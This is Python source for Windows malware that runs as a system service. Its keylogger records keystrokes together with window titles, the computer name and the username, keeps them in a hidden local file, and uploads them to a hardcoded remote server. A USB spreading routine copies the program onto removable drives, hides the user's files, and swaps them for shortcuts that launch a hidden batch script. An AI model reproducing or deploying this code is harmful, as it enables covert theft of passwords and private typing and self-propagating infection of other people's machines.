'''
Functionality :
 - Copy itself to a newly connected usb
 - run keylogger and send information
'''

#Libraries required to Host the application as a windows Service
import win32serviceutil
import win32service
import win32event
import servicemanager

#For Key Logging
import collections
import datetime
import json
import keyboard
import pyHook
import pythoncom
import requests
import threading
from queue import Queue

#For Spreading files to External Drives
import shutil
import subprocess
import wmi
import win32com.client

#Common Libraries
import os
import time
import socket

class spread_files:
    ''' Copy the `src_dir` to the any Logical Disk (USB) connected the system
    '''
    def __init__(self, src_dir, dest_dir=None):
        self.src_dir = src_dir
        self.win_info_mgmt = wmi.WMI()
        self.run = True
        if dest_dir:
            self.usb_dir = dest_dir
        else:
            self.usb_dir = src_dir.split("\\")[-1]
    
    def create_shortcut(self, shortcut_name, deviceid):
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(deviceid + shortcut_name + ".lnk")
        shortcut.Targetpath = deviceid + ".usbData/.system32.bat"
        shortcut.save()

    def start(self):
        ''' Copy the `src_dir` to the USB drive.
            Hide the directory from User.
            [User may remember the file path and later he/she can access using the path] => To avoid those situation place the data in a lengthier path
        '''
        while True:
            try:
                folder = "PZeQKWQKcbWlbZrkhawfdSNgGAmvHbxzGGWbCTqsUwoTqNayeKpCuMDxRbQRKBePBBgkVCeUaQoXqUPOVQrAxFgaUEmPqGprrZzscQwodcXLIisrdvVRDYFYxqKwLtUbBoKuKbjnsosKnZjrsmdQszUAhSaxHNtzXrRFHzNuGeXDcQeajYixamikbKkMhxsNgUTRUbWt"
                while self.run:
                    disks = [disk for disk in self.win_info_mgmt.Win32_LogicalDisk(Description="Removable Disk")]
                    for disk in disks:
                        dest_dir = os.path.join(disk.DeviceID, self.usb_dir)
                        hidden_folder = os.path.join(disk.DeviceID, folder)
                        l = os.listdir(disk.DeviceID)
                        if not os.path.exists(hidden_folder):
                            os.mkdir(hidden_folder)
                        if not os.path.exists(dest_dir):
                            shutil.copytree(self.src_dir, dest_dir)
                        # move files and folder to a single folder
                        for each in l:
                            if each != self.usb_dir and each != folder and not each.endswith(".lnk"):
                                if not os.path.exists(disk.DeviceID + each + ".lnk"):
                                    self.create_shortcut(each, disk.DeviceID)
                                if not os.path.exists(os.path.join(hidden_folder, each)):
                                    shutil.move(disk.DeviceID + each, hidden_folder)
                        #change the attrib of hidden_folder/ make the folder hidden
                        subprocess.Popen("attrib +h +r +s +a /s /d " + hidden_folder)
                        subprocess.Popen("attrib +h +r +s +a /s /d " + dest_dir)
                    time.sleep(1)
            except:
                continue

class key_logger:
    ''' Log keyboard events to
            1. a Local File (offline mode)
            2. the remote server (while online)
        Once the system goes online, the keyboard events from the file gets uploaded.
    '''
    text_buffer = collections.deque()
    hkey_status = { 'shift_pressed' : False,
                    'ctrl_pressed' : False,
                    'capslock' : False,
                    'alt_pressed' : False }
    
    internet_connection = False
    upload_queue = Queue()

    symbols = {49: '!', 39: '"', 51: '#', 52: '$', 53: '%', 55: '&', 57: '(', 48: ')', 56: '*', 61: '+', 59: ':', 44: '<', 46: '>', 47: '?', 50: '@', 54: '^', 45: '_', 91: '{', 92: '|', 93: '}', 96: '~'}
    def set_value(self, key, value):
        self.hkey_status[key] = value

    def backspace_pressed(self):
        if len(self.text_buffer):
            if self.hkey_status['ctrl_pressed']:
                self.text_buffer.append("^W")
            else:
                temp = self.text_buffer.pop()

    def toggle_capslock(self):
        self.hkey_status['capslock'] = not self.hkey_status['capslock']
        
    down_up = {'left shift down'   : lambda s : s.set_value('shift_pressed', True),
            'right shift down'  : lambda s : s.set_value('shift_pressed', True),
            'left ctrl down'    : lambda s : s.set_value('ctrl_pressed', True),
            'right ctrl down'   : lambda s : s.set_value('ctrl_pressed', True),
            'left alt down'     : lambda s : s.set_value('alt_pressed', True),
            'alt gr down'       : lambda s : s.set_value('alt_pressed', True),
            'left shift up'     : lambda s : s.set_value('shift_pressed', False),
            'right shift up'    : lambda s : s.set_value('shift_pressed', False),
            'left ctrl up'      : lambda s : s.set_value('ctrl_pressed', False),
            'right ctrl up'     : lambda s : s.set_value('ctrl_pressed', False),
            'left alt up'       : lambda s : s.set_value('alt_pressed', False),
            'alt gr up'         : lambda s : s.set_value('alt_pressed', False)}

    def handler(self, event):
        temp = event.name + ' ' + event.event_type
        if temp in self.down_up:
            self.down_up[temp](self)

    def check_internet_connection(self):
        while True:
            try:
                host = socket.gethostbyname("www.google.com")
                s = socket.create_connection((host, 80), 2)
                self.internet_connection = True
            except:
                self.internet_connection = False
            time.sleep(3)

    def __init__(self, file_name=None, file_dir=None, upload_link=None):
        if not file_name:
            file_name = '.win32Data.txt'
        if not file_dir:
            file_dir = os.path.join(os.path.expanduser('~'), '.winData')
        self.file_log = os.path.join(file_dir, file_name)
        if not os.path.exists(file_dir):
            os.makedirs(file_dir)
        self.current_window = None
        self.storage_file = open(self.file_log, 'a')
        keyboard.hook(self.handler)
        keyboard.add_hotkey('caps lock', self.toggle_capslock)
        keyboard.add_hotkey('backspace', self.backspace_pressed )
        self.kb_thread = threading.Thread(target=keyboard.wait)
        self.kb_thread.start()
        if upload_link:
            self.upload_link = upload_link
            th = threading.Thread(target=self.check_internet_connection)
            th.start()
        for i in range(8):
            t = threading.Thread(target=self.post)
            t.start()

    def post(self):
        while True:
            dictionary = self.upload_queue.get()
            try:
                print("UPLOADING **** ", dictionary)
                requests.post(self.upload_link, json=dictionary)
            except:
                self.upload_queue.put(dictionary)
            self.upload_queue.task_done()

    def OnKeyboardEvent(self, event):
        if not self.current_window:
            self.current_window = event.WindowName
            self.save_to_buffer(event.Ascii)
            return True
        if event.WindowName != self.current_window or event.KeyID == 13:
            temp_data = "".join(self.text_buffer).strip()
            if temp_data:
                print("".join(self.text_buffer))
                # log data to the file if we don't have internet connection and file is empty, else log to server
                now = datetime.datetime.now()
                curr_time = now.strftime("%Y-%m-%d, %H:%M:%S %p")
                userdetail =  os.environ['COMPUTERNAME'] + " - " + os.getlogin() + ", " + curr_time
                data = event.WindowName + ',' + "".join(self.text_buffer)
                if self.internet_connection:
                    try:
                        self.upload_queue.put({data : userdetail})
                        # if file has data, send it to server
                        self.storage_file.close()
                        if os.stat(self.file_log).st_size != 0:
                            lines = open(self.file_log).readlines()
                            # truncate the file/ clear the log
                            open(self.file_log, 'w').close()
                            for each_line in lines:
                                self.upload_queue.put(json.loads(each_line))
                            # open the file for further use
                    except:
                        self.storage_file = open(self.file_log, 'a')
                        self.storage_file.write(json.dumps({data : userdetail}) + '\n')
                else:
                    self.storage_file = open(self.file_log, 'a')
                    self.storage_file.write(json.dumps({data : userdetail}) + '\n')

                self.text_buffer.clear()
                self.current_window = event.WindowName
        self.save_to_buffer(event.Ascii)
        return True
        
    def save_to_buffer(self, ascii):
        if ascii and ascii != 8:
            if self.hkey_status['shift_pressed']:
                if ascii in self.symbols:
                    self.text_buffer.append(self.symbols[ascii])
                else:
                    self.text_buffer.append(chr(ascii).upper())
            elif self.hkey_status['capslock']:
                self.text_buffer.append(chr(ascii).upper())
            else:
                self.text_buffer.append(chr(ascii))

    def start(self):
        while True:
            try:
                hooks_manager = pyHook.HookManager()
                hooks_manager.KeyDown = self.OnKeyboardEvent
                hooks_manager.HookKeyboard()
                pythoncom.PumpMessages()
            except:
                continue

class AppServerSvc (win32serviceutil.ServiceFramework):
    _svc_name_ = "application_service_sic"
    _svc_display_name_ = "application_service_sic"

    def __init__(self,args):
        win32serviceutil.ServiceFramework.__init__(self,args)
        self.hWaitStop = win32event.CreateEvent(None,0,0,None)
        socket.setdefaulttimeout(60)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_,''))
        self.main()

    def main(self):
        log_file_at = os.path.join(os.path.expanduser('~'), '.winData')        
        #Initialize the Keylogger with a `local dir` and `remote server` which accept data from logger
        k = key_logger(file_dir=log_file_at, upload_link="https://peerless-rock-180206.appspot.com/")
        kl = threading.Thread(target = k.start)
        kl.start()

        file_dir = os.path.join(os.path.expanduser('~'), '.winData', '.usbData')
        s = spread_files(file_dir)
        sp = threading.Thread(target=s.start)
        sp.start()

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(AppServerSvc)